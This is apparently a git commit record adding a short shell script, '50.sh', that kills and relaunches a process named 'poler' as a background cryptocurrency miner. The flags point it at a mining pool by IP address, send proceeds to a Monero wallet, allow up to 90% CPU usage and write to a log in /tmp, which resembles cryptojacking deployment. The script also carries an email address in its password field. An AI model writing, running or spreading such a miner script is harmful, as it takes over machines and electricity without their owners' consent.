1162c023c0df4c9647b7772783d75649448046e8
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-06 02:58:18 +0300

    t9

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 3 -o 109.234.38.25:5989 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass=t9-one-below:lyashko6666@gmail.com -k
